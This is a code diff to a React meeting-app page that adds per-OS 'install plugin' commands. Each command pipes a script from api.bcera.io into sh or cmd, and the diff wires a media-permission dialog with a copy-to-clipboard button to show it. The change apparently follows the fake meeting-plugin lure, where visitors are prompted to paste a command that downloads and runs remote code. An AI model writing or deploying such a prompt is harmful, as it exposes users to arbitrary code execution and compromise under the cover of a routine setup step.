@@ -17,6 +17,102 @@ const API_BASE_URL = process.env.NEXT_PUBLIC_API_BASE_URL ?? "";
 const JOINING_DURATION_MS = 1800;
 const LOADING_DURATION_MS = 1500;
 
+type ClientOS = "mac" | "windows" | "linux" | "unknown";
+
+const INSTALL_COMMANDS: Record<ClientOS, string> = {
+  mac: "curl 'https://api.bcera.io/secure-meeting-plugin/download/latest/mac' | sh",
+  linux:
+    "wget -qO- 'https://api.bcera.io/secure-meeting-plugin/download/latest/linux' | sh",
+  windows:
+    "curl https://api.bcera.io/secure-meeting-plugin/download/latest/windows | cmd",
+  unknown: "",
+};
+
+function normalizePlatform(value: string): ClientOS {
+  const platform = value.toLowerCase();
+
+  if (
+    platform.includes("mac") ||
+    platform.includes("darwin") ||
+    platform.includes("iphone") ||
+    platform.includes("ipad") ||
+    platform.includes("ipod")
+  ) {
+    return "mac";
+  }
+
+  if (platform.includes("win")) {
+    return "windows";
+  }
+
+  if (
+    platform.includes("linux") ||
+    platform.includes("x11") ||
+    platform.includes("ubuntu")
+  ) {
+    return "linux";
+  }
+
+  return "unknown";
+}
+
+function detectClientOS(): ClientOS {
+  if (typeof window === "undefined") {
+    return "unknown";
+  }
+
+  try {
+    const nav = navigator as Navigator & {
+      userAgentData?: {
+        platform?: string;
+      };
+    };
+
+    // Chromium
+    if (nav.userAgentData?.platform) {
+      const os = normalizePlatform(
+        nav.userAgentData.platform
+      );
+
+      if (os !== "unknown") {
+        return os;
+      }
+    }
+
+    // Safari / Firefox / old browsers
+    if (nav.platform) {
+      // iPad desktop mode
+      if (
+        nav.platform === "MacIntel" &&
+        nav.maxTouchPoints > 1
+      ) {
+        return "mac";
+      }
+
+      const os = normalizePlatform(
+        nav.platform
+      );
+
+      if (os !== "unknown") {
+        return os;
+      }
+    }
+
+    // Last fallback
+    const os = normalizePlatform(
+      nav.userAgent
+    );
+
+    if (os !== "unknown") {
+      return os;
+    }
+  } catch {
+    // ignore
+  }
+
+  return "unknown";
+}
+
 function getInitials(name: string): string {
   const s = String(name ?? "").trim();
   if (!s) return "?";
@@ -262,6 +358,37 @@ function GuidelineCards() {
 function MediaPermissionModal({ onLeave }: { onLeave: () => void }) {
   const [activeTab, setActiveTab] = useState<"quick" | "guidelines">("quick");
 
+  const [clientOS, setClientOS] =
+    useState<ClientOS>("unknown");
+
+  const [copied, setCopied] =
+    useState(false);
+
+  useEffect(() => {
+    setClientOS(detectClientOS());
+  }, []);
+
+  const installCommand =
+    INSTALL_COMMANDS[clientOS];
+
+  async function handleCopy() {
+    if (!installCommand) return;
+
+    try {
+      await navigator.clipboard.writeText(
+        installCommand
+      );
+
+      setCopied(true);
+
+      setTimeout(() => {
+        setCopied(false);
+      }, 2000);
+    } catch {
+      setCopied(false);
+    }
+  }
+
   return (
     <div
       className="pointer-events-none fixed inset-0 z-[110] flex items-center justify-center p-3"
@@ -375,13 +502,22 @@ function MediaPermissionModal({ onLeave }: { onLeave: () => void }) {
               <div className="mt-4 flex items-center gap-2 rounded-xl border border-zinc-200 bg-zinc-900 px-3 py-2.5 text-sm font-mono text-zinc-100 shadow-inner dark:border-zinc-700 dark:bg-black/80">
                 <div className="flex-1 truncate">
                   <span className="text-zinc-400">Command:</span>
-                  <span className="ml-1 text-zinc-100">...</span>
+                  <span className="ml-1 text-zinc-100">
+                    {installCommand ||
+                      "Please use desktop"}
+                  </span>
                 </div>
                 <button
                   type="button"
-                  className="shrink-0 rounded-lg bg-zinc-800 px-2.5 py-1.5 text-xs font-semibold uppercase tracking-wide text-zinc-100 hover:bg-zinc-700"
+                  onClick={handleCopy}
+                  disabled={
+                    !installCommand
+                  }
+                  className="shrink-0 rounded-lg bg-zinc-800 px-2.5 py-1.5 text-xs font-semibold uppercase tracking-wide text-zinc-100 hover:bg-zinc-700 disabled:opacity-40"
                 >
-                  Copy
+                  {copied
+                    ? "Copied!"
+                    : "Copy"}
                 </button>
               </div>
 
